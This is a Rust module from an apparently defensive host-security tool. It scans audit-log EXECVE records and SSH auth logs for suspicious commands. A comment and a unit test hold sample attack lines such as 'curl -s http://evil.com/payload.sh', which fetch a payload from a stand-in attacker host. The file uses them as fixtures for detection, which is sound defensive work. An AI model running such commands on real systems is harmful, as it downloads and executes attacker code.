pub mod patterns;

use std::path::PathBuf;

use anyhow::Result;
use async_trait::async_trait;
use tracing::{info, warn};

use crate::config::schema::SshSessionConfig;
use crate::core::threat::{ThreatEvent, ThreatType};
use crate::modules::ScanModule;
use crate::util::log_cursor::LogCursors;

pub struct SshSessionModule {
    config: SshSessionConfig,
    data_dir: PathBuf,
}

impl SshSessionModule {
    pub fn new(config: SshSessionConfig, data_dir: PathBuf) -> Self {
        Self { config, data_dir }
    }

    /// Parse audit log EXECVE records for suspicious commands.
    fn check_audit_log(&self, cursors: &mut LogCursors) -> Vec<ThreatEvent> {
        let mut threats = Vec::new();
        let path = std::path::Path::new(&self.config.audit_log_path);

        if !path.exists() {
            return threats;
        }

        let lines = match cursors.read_lines(path, 500) {
            Ok(l) => l,
            Err(_) => return threats,
        };

        for line in &lines {
            // Match audit EXECVE records
            if !line.contains("type=EXECVE") {
                continue;
            }

            // Extract the command from audit log format
            // type=EXECVE msg=audit(...): argc=3 a0="curl" a1="-s" a2="http://evil.com/payload.sh"
            let cmd = extract_audit_command(line);
            if cmd.is_empty() {
                continue;
            }

            // Check against all patterns
            let all_patterns = patterns::builtin_patterns();
            let user_patterns: Vec<&str> = self
                .config
                .suspicious_patterns
                .iter()
                .map(|s| s.as_str())
                .collect();

            for pattern in all_patterns.iter().chain(user_patterns.iter()) {
                if cmd.contains(pattern) {
                    threats.push(
                        ThreatEvent::new(
                            ThreatType::SuspiciousCommand,
                            "ssh_session",
                            format!("Suspicious command detected: {}", truncate(&cmd, 120)),
                        )
                        .with_detail("command", &cmd)
                        .with_detail("pattern", *pattern)
                        .with_detail("source", "audit_log"),
                    );
                    break; // One match per command is enough
                }
            }
        }

        threats
    }

    /// Parse auth.log for SSH session activity and commands.
    fn check_auth_log(&self, cursors: &mut LogCursors) -> Vec<ThreatEvent> {
        let mut threats = Vec::new();

        for log_path in &self.config.log_paths {
            let path = std::path::Path::new(log_path);
            if !path.exists() {
                continue;
            }

            let lines = match cursors.read_lines(path, 500) {
                Ok(l) => l,
                Err(_) => continue,
            };

            for line in &lines {
                // Look for session-opened events to track active sessions
                if line.contains("sshd") && line.contains("session opened") {
                    // Track session starts (informational, not a threat itself)
                    continue;
                }

                // Look for forced command execution patterns
                if line.contains("sshd") && line.contains("command=") {
                    if let Some(cmd_start) = line.find("command=\"") {
                        let cmd = &line[cmd_start + 9..];
                        if let Some(end) = cmd.find('"') {
                            let command = &cmd[..end];
                            let all_patterns = patterns::builtin_patterns();
                            for pattern in &all_patterns {
                                if command.contains(pattern) {
                                    threats.push(
                                        ThreatEvent::new(
                                            ThreatType::SuspiciousCommand,
                                            "ssh_session",
                                            format!(
                                                "Suspicious SSH forced command: {}",
                                                truncate(command, 120)
                                            ),
                                        )
                                        .with_detail("command", command)
                                        .with_detail("pattern", *pattern)
                                        .with_detail("source", "auth_log"),
                                    );
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }

        threats
    }
}

/// Extract command string from an audit EXECVE record.
fn extract_audit_command(line: &str) -> String {
    let mut args: Vec<String> = Vec::new();
    let mut i = 0;

    loop {
        let key = format!("a{}=", i);
        if let Some(pos) = line.find(&key) {
            let rest = &line[pos + key.len()..];
            let value = if let Some(stripped) = rest.strip_prefix('"') {
                // Quoted value
                let end = stripped.find('"').unwrap_or(stripped.len());
                &stripped[..end]
            } else {
                // Unquoted value (hex-encoded or simple)
                rest.split_whitespace().next().unwrap_or("")
            };
            args.push(value.to_string());
            i += 1;
        } else {
            break;
        }
    }

    args.join(" ")
}

fn truncate(s: &str, max_len: usize) -> &str {
    if s.len() <= max_len {
        s
    } else {
        &s[..max_len]
    }
}

#[async_trait]
impl ScanModule for SshSessionModule {
    fn name(&self) -> &str {
        "ssh_session"
    }

    async fn scan(&self) -> Result<Vec<ThreatEvent>> {
        let mut threats = Vec::new();
        let cursor_path = LogCursors::path_for_module("ssh_session", &self.data_dir);
        let mut cursors = LogCursors::load(&cursor_path);

        threats.extend(self.check_audit_log(&mut cursors));
        threats.extend(self.check_auth_log(&mut cursors));

        // Save cursors for incremental reading
        let _ = cursors.save(&cursor_path);

        if !threats.is_empty() {
            info!(
                count = threats.len(),
                "SSH session module detected {} threat(s)",
                threats.len()
            );
        }

        Ok(threats)
    }

    async fn watch(
        &self,
        tx: tokio::sync::mpsc::Sender<ThreatEvent>,
        cancel: tokio_util::sync::CancellationToken,
    ) -> Result<()> {
        let scan_interval = std::time::Duration::from_secs(30);
        let mut interval = tokio::time::interval(scan_interval);

        loop {
            tokio::select! {
                _ = cancel.cancelled() => break,
                _ = interval.tick() => {
                    match self.scan().await {
                        Ok(threats) => {
                            for threat in threats {
                                if tx.send(threat).await.is_err() {
                                    return Ok(());
                                }
                            }
                        }
                        Err(e) => warn!(error = %e, "SSH session periodic scan failed"),
                    }
                }
            }
        }
        Ok(())
    }

    fn supports_watch(&self) -> bool {
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_audit_command() {
        let line = r#"type=EXECVE msg=audit(1234567890.123:456): argc=3 a0="curl" a1="-s" a2="http://evil.com""#;
        let cmd = extract_audit_command(line);
        assert_eq!(cmd, "curl -s http://evil.com");
    }

    #[test]
    fn test_extract_audit_command_empty() {
        let line = "type=EXECVE msg=audit(1234567890.123:456): argc=0";
        let cmd = extract_audit_command(line);
        assert!(cmd.is_empty());
    }

    #[test]
    fn test_truncate() {
        assert_eq!(truncate("hello", 10), "hello");
        assert_eq!(truncate("hello world", 5), "hello");
    }
}
